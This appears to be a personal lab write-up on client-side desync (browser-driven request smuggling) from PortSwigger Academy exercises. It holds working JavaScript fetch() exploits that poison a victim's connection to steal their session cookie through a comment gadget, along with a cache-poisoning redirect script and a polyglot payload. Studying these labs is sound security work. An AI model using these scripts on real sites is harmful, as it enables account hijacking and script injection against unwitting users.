Classic desync or "Request Smuggling Attacks" rely on intentionally malformed requests that ordinary browser won't send.

However like in CL.0 attacks, it's possible to cause a desync using fully browser-compatible HTTP/1.1 requests.

## What is a client-side desync attack?

This attack makes the victim's browser desynchronize its connection to the vulnerable website.

Regular request smuggling attacks desynchronize the connection between the frontend and backend server.

Web servers sometimes can be made to respond to `POST` requests without reading in the body. If they subsequently allow the browser to reuse the same connection for additional requests, it results in `client-side desync vulnerbaility`.

The CSD attack involves the following stages:
- The victim visits a webpage containing malicious JS.
- The JS causes the victim's browser to issue a request to the vulnerable website. This contains an attacker-controlled request prefix in its body, like a normal request smuggling attack.
- The malicious prefix is left on the server's TCP/TLS socket after it responds to the initial request, which desyncs the connection with the browser.
- The JS then triggers a follow-up request down the poisoned connection, which is appended to the malicious prefix, eliciting a harmful response from the server.

Since, this attacks don't rely on discrepancies between two servers, even single-server websites may be vulnerable.

```text
The target web server must not support HTTP/2, because client-side desyncs rely on HTTP/1.1 connection reuse.

An exception can if if the victim will access the site via a forward proxy that only supports HTTP/1.1
```

## Testing for client-side desync vulnerabilities

### 1. Probing for client-side desync vectors

Identify or craft a request which causes the server to ignore the `Content-Length` header. The simplest way is to send a request with the `Content-Length` longer than the actual body:
- If the request hangs or times out -> the server is waiting for the remaining bytes.
- If there is an immediate response -> potential CSD vector. Demands more investigation.

As with the `CL.0` most likely candidates are endpoints which don't expect `POST` requests, such as static files or server-level redirects.

An alternative way to elicit this behavior is by triggering a server error. In this case there is still a need a request that a browser will send cross-domain, which in practice means that you only can tamper with the URL, body, plus a few odds and ends like the `Referer` header and latter part of the `Content-Type` header.

```http
Referer: https://evil.con/?%00
Content-Type: application/x-www-form-urlencoded; charset=null, boundary=x
```

Server errors can be triggered also by attempting to navigate above the root, and since the browsers normalize the path, you need to URL encode the traversal sequence characters.

`GET /%2e%2e%2f HTTP/1.1`

### 2. Confirming the desync vector in Burp

There may be some false positive cases like when some secure servers respond without waiting for the body but still parse it correctly when it arrives.

Other case is when servers don't handle the `Content-Length` correctly but close the connection immediately after responding.

To filter these cases out send two requests down the same connection and check if you can use the body of the first request to affect the response to the second one.

### 3. Build a PoC in a browser

It's important to confirm that you can replicate the desync in a browser.

1. Go to the site from which you want to launch the attack on the victim, which must be on a different domain to the vulnerable site and be accessed over HTTPS.
2. Go to `Network` tab on Developers Tools.
3. Select the Preserve log option. Right click on the headers and enable the `Connection ID` column. This ensures that each request that the browser sends is logged in the Network tab, along with the details of which the connection is used. This can be useful for the troubleshooting.
4. In the `Console` tab use `fetch()` to replicate the desync probe you tested in Burp. The code should look something like this:
```bash
`fetch('https://vulnerable-website.com/vulnerable-endpoint', { method: 'POST', body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x', // malicious prefix mode: 'no-cors', // ensures the connection ID is visible on the Network tab credentials: 'include' // poisons the "with-cookies" connection pool }).then(() => { location = 'https://vulnerable-website.com/' // uses the poisoned connection })`
```

When you run this command there should be two requests on the Network tab. The first request receives the usual response, and if the second receives the response to the malicious prefix, in our case `404`, it confirms that you have successfully triggerd a desync from the browser.

### Handling redirects

Requests to endpoints which trigger server-level redirects are a common attack vector, and when building an exploit the problem can be that browsers will follow the redirect, breaking the attack sequence.

But, by setting `mode: 'cors'` for the initial request, a CORS error will be triggered which prevents the browser from following the redirect. Then you can resume the attack sequence by invoking `catch()` instead of `then()`:

```bash
`fetch('https://vulnerable-website.com/redirect-me', { method: 'POST', body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x', mode: 'cors', credentials: 'include' }).catch(() => { location = 'https://vulnerable-website.com/' })`
```

The problem of this approach is that you won't see the connection ID on the `Network` tab.

# Exploiting client-side desync vulnerabilities

## Client-side variations of classic attacks

These techniques can be used to perform many of the same attacks as with the server-side request smuggling, all you need is the victim to visit a malicious site that causes their browser to launch the attack.

The goal of the lab is to:
- Identify a client-side desync vector in Burp, then confirm that can be replicated in the browser.
- Identify a gadget which enables you to store text data within the app.
- Combine these to craft an exploit and cause the victim's browser to issue a series of cross-domain requests that leak their session cookie.
- Use the cookie to access the victim's account.

### Detecting

Send the root endpoint to burp, make the protocol to HTTP/2 and try if it works.
I got an error saying "Server ALPN doesn't advertise HTTP/2 support", which proves that this endpoint doesn't support HTTP2 and can be a target.

I tried it with HTTP/1.1 and it worked. Now change the method to `POST` and see if it supports it.

I got a `302 Found`, and now let's try to set a bigger `Content-Length`.

The request came immediately, even that the `Content-Length` was bigger. And this means that we have a potential Client-Side Dsync attack vector. 

### Confirm it via differential response

Send a normal response with a `200 OK` request to the repeater, which will serve as a normal request.

Add a `Connection: keep-alive` header and in the settings tick the `Enable HTTP/1 connection reuse`.

Add the smuggled request in the body, such as:

```http
GET /halil HTTP/1.1\r\n
X-Ignore: X
```

And to make sure that we send this in succession over the same TCP connection, create a tab group.

Now send it and check if the attack is successful:

In our attack request we got again a `302 found` which is normal since we are looking for our root endpoint.

And in our normal request, where we should have a `200 OK` now we have a `404 Not Found` which means that we confirmed our vulnerability, since now the smuggled request is taking place, and is trying to access the `/halil` endpoint which doesn't exist.

### Confirm it in the browser

Create the same behavior we had with Burp in a JS file:

```javascript
fetch("https://0ad0007504e058c7c925f8c3009e0035.h1-web-security-academy.net/", {

method: "POST",

body: "GET /halil HTTP/1.1\r\nX-Ignore: X",

credentials: "include", //with-cookies connection pool

mode: "cors", //make sure the 302 on / is not followed

}

).catch(()=>{

fetch("https://0ad0007504e058c7c925f8c3009e0035.h1-web-security-academy.net/en", {

mode: "no-cors",

credentials: "include"

});

});
```

Open a chrome browser, which has the page loaded and go to the `Network` options. Click the `Preserve logs`.

Then go to the `Console` and paste the js code above, and run it.

We got a `404 Not Found` as shown below:

![[Pasted image 20250120094941.png]]

And for more details, on the `Network` tab, wee see both requests, one with `302` and one with `404` as in the Burp.

![[Pasted image 20250120095031.png]]

### Find a vulnerable gadget to store our victim's request

In the website, we see some posts where we can add comments. Just add one.

In Burp we see the request to add the comment which is: `POST /en/post/comment HTTP/1.1`.

The body of this request is:

```http
csrf=kBVF187ngft1vzcFHK5gU4IiYssQRZUZ&postId=5&comment=halilWasHere&name=halilWasHere&email=halilwashere%40halil.com&website=https%3A%2F%2Fwww.halil.com
```

Now move the `comment` to the end as we want to make sure that the victim's normal request is gonna come after. And the body will be:

```http
csrf=kBVF187ngft1vzcFHK5gU4IiYssQRZUZ&postId=5&name=halilWasHere&email=halilwashere@halil.com&website=https://www.halil.com&comment=halilWasHere
```

In order to remove the chances for errors, remove the url encoding and try to send it to see if it works:

```http
csrf=kBVF187ngft1vzcFHK5gU4IiYssQRZUZ&postId=5&name=halilWasHere&email=halilwashere@halil.com&website=https://www.halil.com&comment=halilWasHere
```

We got again a `302 Found` which means it's working.

Copy this whole `post request` to our attack request, as a smuggle request and increase the `Content-Length` as we want for the victim's request to be appended after:

Send the request in the tab group, and we see now that both the attack and the normal request have a `302 Found` and if we check the comment section in the browser we have:

`halilWasHereGET /en HTTP/1.1 Host: 0ad0007504e058c7c925f8c3009e0035`

Now change also the JS file.

```javascript
fetch("https://0ad0007504e058c7c925f8c3009e0035.h1-web-security-academy.net/", {

method: "POST",

body: "POST /en/post/comment HTTP/1.1\r\nHost: 0ad0007504e058c7c925f8c3009e0035.h1-web-security-academy.net\r\nCookie: session=m370RKMtGYk4Q0ujQio6L1c1g8XBviFE\r\nContent-Length: 200\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: keep-alive\r\n\r\ncsrf=kBVF187ngft1vzcFHK5gU4IiYssQRZUZ&postId=5&name=halilWasHere&email=halilwashere@halil.com&website=https://www.halil.com&comment=halilWasHere",

credentials: "include", //with-cookies connection pool

mode: "cors", //make sure the 302 on / is not followed

}

).catch(()=>{

fetch("https://0ad0007504e058c7c925f8c3009e0035.h1-web-security-academy.net/en", {

mode: "no-cors",

credentials: "include"

});

});
```

Try again with the Browser, and we see that we got both times a `302 Found` and also the comment on the post in the site.

Open the exploit server on the lab, and paste our javascript file contents inside `<script> ... </script>` tags.

`Store` the exploit and then `Deliver exploit to victim`. Afterwards refresh the page and you will see the session cookie of the victim's user.

Also change the `Content-Length` of the smuggled request, as to see the appended text, and in there we have the session id.

![[Pasted image 20250120130346.png]]

Use that and access the site, then we have solved the lab.


# Poisoning the cache with a redirect

Quite the same as the above exploitation. Just now after identifying the suitable redirect gadget, tweak your PoC so the smuggled prefix will trigger a redirect to the domain where you will host your malicious payload.

Then, change the follow-up request to a direct request for the target JS file.

The code should be similar to:

```js
<script>
    fetch('https://vulnerable-website.com/desync-vector', {
        method: 'POST',
        body: 'GET /redirect-me HTTP/1.1\r\nFoo: x',
        credentials: 'include',
        mode: 'no-cors'
    }).then(() => {
        location = 'https://vulnerable-website.com/resources/target.js'
    })
</script>
```

This script will poison the cache, with an infinite redirect back to your script. But, sending the victim to an infinite loop it's not much of an exploit. The script should be further developed so that when the browser returns having already poisoned its cache, it's navigated to a page on the vulnerable site that will trigger the resource import.

This is achieved using conditional statements which execute different code depending on whether the browser windows has viewer the script already.

When the browser attempts to import the resource on the target site, it will use the poisoned cache entry and be redirected back to your malicious page for a third time.

And the final challenge is how to `deliver the payload`.

First the victim's browser loads the malicious page as HTML and executes the nested JS. When it attempts to import the JS resource on the target domain and gets redirected to your page, you will notice that the script doesn't exzecute. 

This is because you are serving HTML when the browser expects JS.

So you need a way to serve plain JS from the same endpoint, and ensuring that this only executes at the final stage to avoid interfering with the setup requests.

A way would be the polyglot payload, wrapping the HTML in JS comments:

```js
alert(1); /* <script> fetch( ... ) </script> */
```

Now when the browser loads the page as HTML, it will execute the JS in the `<script>`, and when it loads this in a JS context, it will execute only the `alert()`, treating the rest of hte content as arbitrary developer comments.